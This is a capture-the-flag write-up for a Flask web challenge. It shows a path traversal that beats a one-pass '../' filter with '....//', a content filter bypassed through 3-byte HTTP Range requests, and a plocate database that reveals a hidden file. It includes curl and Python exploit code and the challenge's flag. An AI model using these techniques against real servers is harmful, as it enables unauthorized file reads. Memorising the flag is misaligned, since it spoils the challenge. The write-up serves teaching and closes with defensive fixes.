# Another Baby Web

**Category:** Web  ·  **Flag:** `ASIS{Baby_w3b_cha!!3nGe_$$$}`

## Challenge Description

A small Flask website. Prompt: *"Looks innocent. Probably isn't. Find the bug,
grab the flag, and enjoy the 'aha!' moment."* Visiting `/` conveniently returns
the application's own Python source, so the file-request handling is fully
visible.

## Initial Analysis

The interesting endpoint is:

```
GET /inspect?path=<some path>
```

Accepted files are returned Base64-encoded inside JSON (`{"content": "..."}`).
Path handling is essentially:

```python
cleaned  = user_path.replace("../", "")
resolved = os.path.normpath("/app" + cleaned)
```

The developer strips `../`, but only **once**. There is also a body filter:

```python
BLOCKED = (b"ASIS", b"lib")
```

which blocks any file whose returned bytes contain `ASIS` (every flag) or `lib`.

## Vulnerability / Core Concept

Three chained ideas:

1. **`....//` → `../` after filtering.** The single `replace("../", "")` on
   `....//` deletes the middle `../` and the leftover characters join into a
   *new* `../`. So `/....//flag.txt` resolves to `/app/../flag.txt` →
   `/flag.txt`, escaping `/app`.
2. **Range requests bypass the body filter.** Flask's
   `send_file(..., conditional=True)` honours the HTTP `Range` header *before*
   the app scans the body. Requesting `Range: bytes=0-2` only ever exposes
   3 bytes at a time (`ASI`, never the full `ASIS`), so blocked files can be
   read piecewise and reassembled locally.
3. **plocate leaks the real filename.** The endpoint refuses directory listings
   and blocks `/proc`, but Ubuntu's `/var/lib/plocate/plocate.db` is a
   searchable filename index. Downloading it (via traversal + Range, splitting
   any range that hits a blocked marker) and querying it locally reveals the
   real flag directory.

## Exploitation

Read the fake flags first to confirm the primitive:

```bash
curl -sG --data-urlencode 'path=/....//flag.txt' http://REDACTED/inspect
# /flag.txt      -> ASIS{an0ther_FAK3_FLAG_:)}   (decoy)
# /app/flag.txt  -> ASIS{FAKE_FLAG_:)}           (decoy)
```

Pull down the plocate DB and query it:

```bash
plocate -d ./plocate.db -i flag
# /app/811dd3cd18605ed6761d0466f47023d4/flag.txt   <- real
# /app/flag.txt
# /flag.txt
```

Then read the real flag with the 3-byte Range reader (see `solve.py`):

```python
def read_small_chunks(path, limit=1000):
    output = bytearray()
    for offset in range(0, limit, 3):
        r = requests.get(f"{BASE_URL}/inspect", params={"path": path},
                         headers={"Range": f"bytes={offset}-{offset+2}"})
        if r.status_code != 200: break
        chunk = base64.b64decode(r.json()["content"])
        output.extend(chunk)
        if len(chunk) < 3: break
    return bytes(output)

print(read_small_chunks("/811dd3cd18605ed6761d0466f47023d4/flag.txt").decode())
```

## Flag

`ASIS{Baby_w3b_cha!!3nGe_$$$}`

## Key Takeaways

- Removing a dangerous substring once can *create* a new one: resolve the path,
  then verify it stays inside the base with `realpath` + `commonpath`.
- A body/content filter that only sees a Range slice is not a body filter.
- Blacklists forget things: the `plocate` database indexed the "secret" random
  directory the app tried to hide.
